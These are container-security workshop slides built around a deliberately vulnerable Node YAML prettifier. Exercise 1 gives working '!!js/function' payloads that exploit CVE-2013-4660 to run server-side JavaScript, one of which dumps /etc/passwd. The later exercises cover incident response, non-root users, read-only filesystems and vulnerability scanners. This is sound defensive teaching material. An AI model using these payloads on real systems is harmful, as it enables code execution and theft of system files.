## Exercise 1
In this exercise, we will:

* Start-up the example application
* Hack it!

----

### Step 1
Open the directory ex1 and build the application:

```
docker build -t example-app .
...
docker run -d -p 1337:1337 --name example-app example-app
```
You should now be able to access the application at the address shown by the docker port command e.g:
```
docker port example-app
1337/tcp -> 0.0.0.0:1337
````

----

Try out the application with some simple YAML examples such as (all of these snippets can be found in the yaml subdirectory): 

```
--
oh: wow!
what: a nice YAML that is!
look_ma:
  - it
  - also
  - highlights
  - lists!
```

----

It’s time to hack the application! It turns out the library is vulnerable to CVE-2013-4660, which allows for the execution of arbitrary JavaScript code.

Try prettifying the following snippet:
```
---
hi: there
test: !!js/function |
  function f() {
    console.log('Hello from server side!');
  }();
```

If we take a look at the logs for the application, you should see that the JavaScript function has executed on the server!

----

We can of course take this further. If you know JavaScript feel free to play around with what’s possible. If you take a look at server.js, you will see that various modules have been loaded into the global namespace, so they are available to use directly.

----

As the fs module has been loaded, it’s easy for us to interact with the filesystem. Let’s start by dumping /etc/passwd.

```
---
hi: there
test: !!js/function |
  function f() {
    fs.readFile('/etc/passwd', 'ascii', function (err, data) {
       if (err) throw err;
       console.log(data);
    });
  }();
```

----

You should now see the output of the file in docker logs. We could also have written the contents out to another file accessible to the attacker.

Now let’s do something a little more disruptive. Try evaluating the YAML file in `yaml/evil.yml` 

If you want to take this even further, have a think about how you could avoid detection and insert backdoors in the system.

----

So you should now have been able to “hack” our application.

What should you do if this happens to your site?

----

### Incident Response

Ideally orgs will have an incident response manual.

But:
* Immediately move to isolate compromised container
** And VM/host
* Do not delete
** Keep evidence for analysis
* Establish extent of attack
* Move calmly and deliberately

----

### Docker tools

Docker has several features that can help:

Isolation
* docker network
* docker stop

Analysis
* docker diff
* docker logs
* docker top

----

## Exercise 2: Analyze the Hack

At the end of this exercise you should:

* Run a hacked version of our application
* Isolate the hacked container
* Analyse the container

----

### Step 1:

If it isn’t running already, relaunch the application and execute evil.yml:

```
docker rm -f example-app
docker run -d -p 1337:1337 --name example-app example-app
```

----

### Step 2:

The first thing we want to do is disconnect the application from the network. To do this, run:

```
docker network disconnect bridge example-app
````

If you now try to load the application in the browser, it should be inaccessible.

----

### Step 3:

Take a look at the different docker  commands for getting information on the running container, which you can find in docker --help and at docs.docker.com. In particular, try inspect, top and logs.

If you’re concerned that the container isn’t sufficiently isolated or want to stop rogue processes that are running in the container we can do so with docker stop. Run this now:
```
docker stop example-app
````

----

This has stopped the container and all processes running inside it, but left the filesystem intact. Therefore we can still run:
```
docker diff example-app
```
This will show any differences in the filesystem inside the container, compared to the image it was built from. In our case, we can see a new index.html has been created, corresponding to our hacked frontpage. If a hacker had any tools or scripts, we would also see those.

----

### Security Philosophy 101: Defence In Depth

* Don’t rely on any one layer for defence
* Employ multiple techniques
* Firewalls, authentication, encryption, monitoring...

![Castle](800px-Deal_Castle_Aerial_View.jpg)

----

### Security Philosophy 101: Least Privilege

A (process/container) should only have access to the data and resources essential to perform its function

Originally articulated by Jerome Saltzer
Nathan McCauley and Diogo Mónica extended to containers in "Least Privilege Microservices" talk. 

https://en.wikipedia.org/wiki/Principle_of_least_privilege
https://youtu.be/8mUm0x1uy7c

----

### Attack Mitigation

Let’s start with some simple ways to make things harder for an attacker:

* Set a USER
* Run a read-only filesystem

----

### Setting a USER - Why?

By default, users are not namespaced in Docker
* UIDs are the same on the host and in the container
* Root in the container is root on the host
* Consider possibility of container breakout

Even then, attackers should be constrained with the container
* Shouldn’t run apps in VMs as root
* So don’t do it in a container

----

### Setting a USER - How?

Start by creating the user in the Dockerfile:
```
FROM debian:wheezy
RUN groupadd -r myuser && useradd -r -g myuser myuser
```
Do anything that needs root privileges (e.g. installing packages)
```
RUN apt-get update \
	&& apt-get install -y curl \
	&& rm -rf /var/lib/apt/lists/*
```
Then change to the user:
```
USER myuser
```

----

### Setting a USER - in scripts

Sometimes need root privileges in start-up script
* E.g. changing ownership of files

Can’t use USER statement
Has to be done in the script

----

### Setting a USER - Redis Entrypoint Script

```
#!/bin/sh
set -e


# allow the container to be started with `--user`
if [ "$1" = 'redis-server' -a "$(id -u)" = '0' ]; then
	chown -R redis .
	exec gosu redis "$0" "$@"
fi


exec "$@"
```

----

### Setting a USER - WTF is gosu?

* https://github.com/tianon/gosu
* Very similar to sudo
* But better behaviour with containers
```
$ docker run -it --rm ubuntu:trusty sudo ps aux
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         1  3.0  0.0  46020  3144 ?        Ss+  02:22   0:00 sudo ps aux
root         7  0.0  0.0  15576  2172 ?        R+   02:22   0:00 ps aux
$ docker run -it --rm -v $PWD/gosu-amd64:/usr/local/bin/gosu:ro ubuntu:trusty gosu root ps aux
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         1  0.0  0.0   7140   768 ?        Rs+  02:22   0:00 ps aux
```

----

### Running a Read-only Filesystem

Pretty simple:
```
docker run --read-only debian sh -c 'echo "x" > /file'
sh: 1: cannot create /file: Read-only file system
```
Can mount volume for specific files:
```
docker run --read-only -v /tmp/con:/tmp debian \ 
  sh -c 'echo "x" > /tmp/file'
```
Or even use tmpfs:
```
docker run --read-only --tmpfs /tmp:size=65536k \
  debian sh -c 'echo "x" > /tmp/file'
```

----

## Exercise 3: Mitigate the attack
At the end of this exercise you should:

* Understand how to set a USER
* Understand how to use --read-only
* Understand how they help mitigate attacks

----

Step 1
* Using the slides as a guide, get the example-app running as a user.

Step 2
* Run the attacks from exercise 1 again. Note any differences from the previous results.

Step 3
* Again using the slides as a guide, run the example-app with a read-only filesystem. Use the image you created in Step 1 which runs as a user.

----

Step 4
* Run the attacks from exercise 1 again. Note any differences from the previous results.

Step 5 (optional)
* Create an entrypoint script for the container and switch to the user using gosu.

----

### Not a solution

It’s important to note that we haven’t solved the problem
* Still executing arbitrary JavaScript
* Made the attacker’s life harder
* But haven’t prevented the attack

So what is the solution?

----

### Don’t Run Vulnerable Software!

Only real solution is to replace the library
* Running old and known-vulnerable code will get you hacked

But how do we know?
* Impossible task to keep up-to-date with CVEs
* Hard enough to know what libraries are in use

----

### Automate

Use an image scanner

Will automatically scan images for known vulnerabilities.

Several options:
* Nautilus from Docker
* Clair from CoreOS
* Peekr from Scalock
* Twistlock
* Atomic Scan from Red Hat

----

### Nautilus

Docker Inc’s solution for scanning images.

Already being used to scan the official images.

Will be launched publicly very soon...

![nautilus](nautilus.png)

----

### Peeker

Commercial solution from Scalock

Hashes individual files and searches for vulnerabilities

----

### Clair

Open Source solution from CoreOS

Can run locally or as part of a service (e.g. Quay)

Uses package lists (so has to understand package managers)


![clair](coreos-clair.jpg)

----

### Atomic Scan

Recently announced from Red Hat
* http://developers.redhat.com/blog/2016/05/02/introducing-atomic-scan-container-vulnerability-detection/
Part of the Atomic Project

Pluggable

Assumes part of Red Hat ecosystem

----

### Dependency Checkers

There are several existing tools to help scan for vulnerabilities:

* OWASP Dependency Checker
  * https://github.com/jeremylong/DependencyCheck
  * Java, .NET, Ruby, Node.js and Python

* Node Security Project
  * https://nodesecurity.io/tools
  * NPM

----

## Exercise 4: Know Thy Weaknesses

At the end of this exercise you should:

* Know how to install and run Clair
* Understand which vulnerabilities are likely to be found/missed
* Have thought about how to integrate scanning into existing workflows

----

### Step 1

In the directory ex4, you will find a docker-compose.yml file inside, which you can use to start Clair by running docker-compose up -d. If you run docker logs clair_clair, you should see that Clair has started and is updating the vulnerability database.

----

### Step 2:
Running images against Clair isn’t quite a simple as it sounds as Clair was designed to be called from a REST API and embedded in a workflow, rather than called from the command line. For the purposes of this tutorial, we can use the Go program analyze-local-images (https://github.com/coreos/clair/tree/master/contrib/analyze-local-images). 
Start by extracting the IP address of our Clair instance:
```
CLAIR_IP=$(docker inspect -f '{{.NetworkSettings.Networks.ex4_clairnet.IPAddress}}' clair_clair)
```

----

And now run the analyser tool:
```
docker run -it \
    --net ex4_clairnet \
    -v /var/run/docker.sock:/var/run/docker.sock \
    --name analyser amouat/clair-analyse \
      -endpoint http://$CLAIR_IP:6060 \
      -my-address analyser example-app
```
This should output a list of all the vulnerabilities found in the example-app image. Compare this list to the list of vulnerabilities for the underlying node image. Check to see if you can find the YAML vulnerability in the list.

----

### Step 3

Test out the NSP scanner for Node vulnerabilities:

```
docker run -it example-app bash
npm install nsp -g
nsp check
```

----

### Conclusion

There are lot of different aspects to container security!
Remember defence in depth and least privilege concepts

Containers provide lots of tools and features for security
* Ways to limit privileges
* Tools for auditing
* Scanning services

Used properly, they will add an extra layer of security to your application